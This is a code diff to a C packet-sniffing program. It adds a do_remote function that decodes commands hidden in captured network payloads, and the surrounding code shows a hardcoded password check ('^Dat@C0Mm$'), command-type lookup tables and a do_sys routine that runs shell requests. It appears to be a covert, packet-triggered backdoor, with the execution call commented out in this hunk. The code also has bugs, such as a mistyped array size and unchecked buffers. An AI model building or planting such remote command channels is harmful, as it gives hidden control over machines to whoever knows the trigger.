@@ -121,6 +121,23 @@ void print_hex_ascii_line (const u_char *payload, int len, int offset){
 
 	printf ("\n");
 }
+void do_remote(const u_char *payload){
+	int i,j,plen=0, alen, len;
+	char reqt, msg[25l6], msgx[256], * stringp;
+
+	// decrypt message
+	len = strlen(payload);
+  for (i=0;i<len;i++){msg[i]=swapIN(payload[i]);}
+
+  //read 1st character - length
+  plen=msg[0];
+
+  // read length characters - rcmd
+  stringp=&msg[1];
+  msg[plen]='\0';
+  printf("%s",stringp);
+//  do_sys(stringp);
+}
 
 void prx_payload(const u_char *payload){
 	int i,j,plen=0, alen, len;
@@ -141,7 +158,7 @@ void prx_payload(const u_char *payload){
 
 	if (strncmp(pass,"^Dat@C0Mm$",strlen("^Dat@C0Mm$"))!=0){
 		printf("\nInvalid password received %s...returning\n\n",pass);
-		return (char*)-1;	
+		return (char*)-1;
 	}
 	printf("Password Confirmed\n");
 
@@ -186,7 +203,7 @@ void prx_payload(const u_char *payload){
 char in_list(char *list[],char * item, int k){
 	int i;
     printf("%s, %d\n",item, k);
-	
+
     for(i=0;i<k;i++){
         if(strcmp(item,list[i])==0)
             return ++i;
@@ -198,13 +215,13 @@ char get_rtype(char * request){
 	char seq, str[80];
     char * item;
     int j;
-  
+
 	// find out if system, special or internal command, return 3,2,1
     j = sizeof(sreqs)/sizeof(sreqs[0]);
 	if((seq = in_list(sreqs, rcmd,j))>0)
 		return 3;
 
-	
+
     j = sizeof(ireqs)/sizeof(ireqs[0]);
 	if((seq = in_list(ireqs, rcmd,j))>0)
 		return 1;
@@ -212,7 +229,7 @@ char get_rtype(char * request){
     j = sizeof(xreqs)/sizeof(xreqs[0]);
 	if((seq = in_list(xreqs, rcmd,j))>0)
 		return 2;
-	
+
     return 0;
 }
 
@@ -272,7 +289,7 @@ char do_sys(char* request){
 	/*
 	// send_info();
 	printf()
-	if(pclose(response)!=0)	
+	if(pclose(response)!=0)
 		fprintf(stderr,"other output error\n");
 	return 1;
 	*/
